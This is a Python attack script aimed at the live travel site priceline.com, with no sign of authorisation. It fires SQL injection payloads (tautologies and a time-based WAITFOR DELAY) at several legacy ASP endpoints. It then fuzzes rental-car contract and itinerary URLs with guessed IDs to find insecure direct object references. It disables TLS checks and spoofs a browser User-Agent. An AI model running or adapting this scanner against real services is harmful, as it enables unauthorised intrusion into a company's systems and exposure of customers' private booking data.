import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://www.priceline.com"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

# 1. SQL Injection check on legacy ASP endpoints
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND (SELECT 1)=1",
    "1' OR 1=1--"
]

ASP_ENDPOINTS = [
    "/chkrequest.asp",
    "/hr.asp",
    "/Session_Timeout.asp",
    "/qp.asp"
]

PARAMETERS = ["id", "req", "user", "file", "page"]

print("="*60)
print(" 1. Testing Legacy ASP Endpoints for SQLi/Errors")
print("="*60)

for endpoint in ASP_ENDPOINTS:
    for param in PARAMETERS:
        for payload in SQLI_PAYLOADS:
            target = f"{BASE_URL}{endpoint}?{param}={requests.utils.quote(payload)}"
            try:
                start = time.time()
                resp = requests.get(target, headers=HEADERS, verify=False, timeout=10, allow_redirects=False)
                elapsed = time.time() - start
                
                # Check for 500 errors (SQLi syntax error) or time delays (Time-based SQLi)
                if resp.status_code == 500:
                    print(f"[!] 500 Internal Error on {target}")
                elif elapsed > 4.5 and "WAITFOR" in payload:
                    print(f"[!!!] Possible Time-Based SQLi on {target} (Took {elapsed:.2f}s)")
                elif resp.status_code == 200:
                    print(f"[+] 200 OK (Bypassed Redirect?) on {target}")
            except requests.exceptions.RequestException:
                pass


# 2. IDOR Parameter fuzzing on 200 OK endpoints
IDOR_ENDPOINTS = [
    "/rentalcars/contract",
    "/rentalcars/retailContract",
    "/travel-itinerary/"
]

IDOR_PARAMS = ["id", "contractId", "bookingId", "itineraryId", "ref", "user"]
TEST_IDS = ["1", "12345", "999999", "admin"]

print("\n" + "="*60)
print(" 2. Fuzzing 200 OK Endpoints for IDOR Parameters")
print("="*60)

for endpoint in IDOR_ENDPOINTS:
    print(f"\n[*] Testing {endpoint}...")
    baseline_len = len(requests.get(f"{BASE_URL}{endpoint}", headers=HEADERS, verify=False, allow_redirects=False).text)
    
    for param in IDOR_PARAMS:
        for test_id in TEST_IDS:
            target = f"{BASE_URL}{endpoint}?{param}={test_id}"
            try:
                resp = requests.get(target, headers=HEADERS, verify=False, timeout=5, allow_redirects=False)
                
                # Check if the response size changes significantly when we add an ID
                if resp.status_code == 200:
                    diff = abs(len(resp.text) - baseline_len)
                    if diff > 500: # Significant change in page content
                        print(f"[+] Change Detected ({diff} bytes difference): {target}")
                elif resp.status_code != 200:
                    print(f"[*] Status {resp.status_code} for {target}")
                    
            except requests.exceptions.RequestException:
                pass

print("\n[*] Testing complete.")
